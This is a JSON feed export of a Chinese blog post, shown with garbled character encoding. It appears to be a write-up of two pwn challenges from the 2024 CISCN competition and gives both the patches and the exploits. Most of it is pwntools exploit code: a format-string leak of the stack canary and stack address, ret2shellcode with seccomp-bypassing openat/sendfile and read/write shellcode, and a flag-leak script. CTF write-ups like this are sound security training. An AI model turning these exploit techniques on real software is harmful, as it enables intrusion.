{
    "version": "https://jsonfeed.org/version/1",
    "title": "null â€¢ All posts by \"shellcode\" tag",
    "description": "æ¬¢è¿æ¥åˆ°Huançš„ç¬”è®°ç©ºé—´~~~~~~ğŸŒ¸",
    "home_page_url": "https://yhuanhuan01.github.io",
    "items": [
        {
            "id": "https://yhuanhuan01.github.io/2024/06/25/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/",
            "url": "https://yhuanhuan01.github.io/2024/06/25/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/",
            "title": "2024Ciscnå›½èµ›å¿ƒå¾—",
            "date_published": "2024-06-25T13:17:42.000Z",
            "content_html": "<h1 id=\"2024ciscnå›½èµ›å¿ƒå¾—\"><a class=\"markdownIt-Anchor\" href=\"#2024ciscnå›½èµ›å¿ƒå¾—\">#</a> 2024Ciscn å›½èµ›å¿ƒå¾—</h1>\n<blockquote>\n<p>å‰è¨€</p>\n</blockquote>\n<pre><code>ä»Šå¹´æ€»çš„æ¥è¯´ï¼Œpwnæ–¹å‘ä¸¤é“é¢˜éƒ½ä¸æ˜¯å¾ˆéš¾ã€‚è™½ç„¶ä¸€é“éƒ½æ²¡ç»™åšå‡ºæ¥ã€‚è¿˜æ˜¯ç”±äºç»éªŒä¸è¶³å¯¼è‡´çš„å§ã€‚é¦–å…ˆç¬¬ä¸€é“pwnçš„è¯ï¼Œåœ¨æœ¬åœ°æ˜¯èƒ½è¯»å–åˆ°flagæ–‡ä»¶ï¼Œä½†æ˜¯è¿œç¨‹å°±æ˜¯ä¸èƒ½å»è¯»å–flagï¼Œçº¿ä¸‹è¯¢é—®äº†ä¸€ä¸ªåä¸œåŒ—ç¬¬äºŒåé˜Ÿä¼çš„pwnå¸ˆå‚…ï¼Œæ‰çŸ¥é“è¿œç¨‹æ‰“å¼€flagçš„fdå¹¶ä¸æ˜¯3ï¼Œè€Œæ˜¯5ï¼Œæ˜¯openatçš„raxçš„å€¼ï¼ŒçœŸæ˜¯å­¦åˆ°äº†ä¸å°‘ä¸œè¥¿ã€‚ç¬¬äºŒé“æ˜¯å°†ç¬¦å·è¡¨å…¨éƒ½å»æ‰ï¼Œå› ä¸ºç¬¬ä¸€é¢˜ä¸€ç›´ä»¥ä¸ºæ˜¯æ ˆçš„é—®é¢˜åœ¨ä¸æ–­è°ƒè¯•ï¼Œå¯¼è‡´ç¬¬äºŒé¢˜å…‰fixå¹¶æ²¡æœ‰å»åšã€‚\n</code></pre>\n<h3 id=\"pwn_1\"><a class=\"markdownIt-Anchor\" href=\"#pwn_1\">#</a> pwn_1</h3>\n<h5 id=\"fix\"><a class=\"markdownIt-Anchor\" href=\"#fix\">#</a> fix</h5>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625180143222.png\" alt=\"image-20240625180143222\"></p>\n<p>å°† 0x80-&gt; æ”¹ä¸º 0x50 å³å¯</p>\n<h5 id=\"break\"><a class=\"markdownIt-Anchor\" href=\"#break\">#</a> break</h5>\n<p>NX å…³é—­ï¼Œæ ˆå¯æ‰§è¡Œï¼Œå¾€æ ˆä¸Šå†™å…¥ shellcodeï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ³„éœ² stack åœ°å€ï¼Œä»è€Œæ§åˆ¶è¿”å›åœ°å€è¿”å›åˆ° shellcode å¤„ã€‚</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625180959807.png\" alt=\"image-20240625180959807\"></p>\n<p>ç¦ç”¨ openã€readvã€writevã€å’Œ exev ç³»åˆ—ã€‚</p>\n<p>å¯ä»¥åˆ©ç”¨ openatã€readã€writeã€sendfileã€‚</p>\n<p>å¯æƒœä¸€ç›´å¿˜è®°ç”¨ readã€writeã€‚ä»¥ä¸ºæ˜¯æ ˆçš„é—®é¢˜ï¼Œç»“æœæ˜¯è¿œç¨‹çš„ fd å’Œæœ¬åœ°çš„ fd ä¸ä¸€æ ·å¯¼è‡´çš„ã€‚</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625181146191.png\" alt=\"image-20240625181146191\"></p>\n<p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ² canary å’Œ stack çš„åœ°å€ã€‚</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'->set name\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%25$p'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'->set name\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>stack_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x118</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x60</span></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ ret2shellcode å°±è¡Œ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shellcode <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>openat<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"flag\\x00\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>shellcode <span class=\"token operator\">+=</span> shellcraft<span class=\"token punctuation\">.</span>sendfile<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rax'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#fd è¦æ˜¯ rax ä¸èƒ½æ˜¯ 3ï¼Œå¦åˆ™è¯»ä¸åˆ°è¿œç¨‹ flag</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x90'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'->set name\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯è‡ªå·±å†™çš„ openat + read + write çš„æ±‡ç¼–ã€‚</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tpush 0x67616c66</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tmov rsi, rsp</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tpush -0x64</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tpop rdi</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\txor edx, edx</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tmov eax, 257</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tsyscall</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tmov edi, eax</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tmov rsi, &#123;&#125;</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tmov edx, 0x40</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\txor eax, eax</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tsyscall</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tmov edi, 1</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tmov rsi, &#123;&#125;</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tmov edx, 0x40</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tmov eax, 1</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tsyscall</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>'''</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>pl <span class=\"token operator\">=</span> shellcode<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>dug<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'->set name\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"pwn_2\"><a class=\"markdownIt-Anchor\" href=\"#pwn_2\">#</a> pwn_2</h3>\n<blockquote>\n<p>ä¸å¾—ä¸è¯´ï¼Œå»ç¬¦å·è¡¨å±å®éš¾çœ‹ã€‚å”‰ï¼Œæ€ªæˆ‘å¿˜è®°æ¢å¤ç¬¦å·è¡¨äº†ï¼Œrizz çš„æ¢å¤ç¬¦å·è¡¨çš„æ•ˆæœä¸€è¨€éš¾å°½ã€‚</p>\n</blockquote>\n<blockquote>\n<p>åœ¨è¿™é‡Œç‰¹åˆ«æ„Ÿè°¢ eastXueLia å¸ˆå‚…ï¼Œæµ‡æˆ‘ä½¿ç”¨ flare æ¢å¤ç¬¦å·è¡¨ã€‚ä»¥å‰æ¢å¤ç¬¦å·è¡¨å„ç§ç¢°å£ï¼Œç»ˆäºæœ‰ä¸€ä¸ªå¯ä»¥æ¢å¤ç¬¦å·è¡¨ç‰¹åˆ«æœ‰ç”¨çš„æ–¹å¼äº†ï¼</p>\n</blockquote>\n<h5 id=\"fix-2\"><a class=\"markdownIt-Anchor\" href=\"#fix-2\">#</a> fix</h5>\n<p>åˆ©ç”¨ flare æ¢å¤ç¬¦å·è¡¨ä¹‹å</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625201547611.png\" alt=\"image-20240625201547611\"></p>\n<p>åœ¨è¿™é‡Œå°† /flag åå­—æ”¹ä¸€ä¸‹ï¼Œå°±èƒ½é˜²å¾¡æˆåŠŸã€‚</p>\n<h5 id=\"break-2\"><a class=\"markdownIt-Anchor\" href=\"#break-2\">#</a> break</h5>\n<p>add</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625202729350.png\" alt=\"image-20240625202729350\"></p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625202747051.png\" alt=\"image-20240625202747051\"></p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625202802852.png\" alt=\"image-20240625202802852\"></p>\n<p>åˆ†é…ä¸€ä¸ªç©ºé—´ï¼Œå¹¶å‘å…¶å†™å…¥ 8 å­—èŠ‚å¤§å°çš„æ•°æ®</p>\n<p>check</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625211015394.png\" alt=\"image-20240625211015394\"></p>\n<p>åœ¨è¿™é‡Œä¼šæŠŠ flag è¯»å…¥ä¸€ä¸ªä½ç½®ã€‚</p>\n<p>get</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625211231319.png\" alt=\"image-20240625211231319\"></p>\n<p>è¿™é‡Œå¯ä»¥å®Œæˆ flag çš„æ³„éœ²</p>\n<p>åªè¦æ‰¾åˆ°å°† flag å†™å…¥å†…å­˜å†…ï¼Œå¹¶æ‰¾åˆ°ï¼Œä½¿ç”¨ get å³å¯æ‰¾åˆ° flag (æœ¬åœ°æµ‹è¯•æ˜¯è¿™æ ·ï¼Œè¿œç¨‹åº”è¯¥è¿˜ä¼šå‡ºå•¥å¹ºè›¾å­å§)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># host, port = \"47.103.122.127:30175\".split(\":\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote(host, int(port))</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn2_'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># libc = ELF('/home/h711/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn2_'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #è®¾ç½®ç§å­</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>lss     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> s                  <span class=\"token punctuation\">:</span>log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1;31;40m%s --> 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>1: ls flag</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>2: add flag</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>3: edit flag</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>4: del flag</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>5: get flag</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>6: check flag</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'6: check flag\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'6: check flag\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token number\">0x4ef784</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token number\">0x4efaf0</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'6: check flag\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625211439570.png\" alt=\"image-20240625211439570\"></p>\n<p>ç²˜å‡ ç¯‡ blog å§</p>\n<p><span class=\"exturl\" 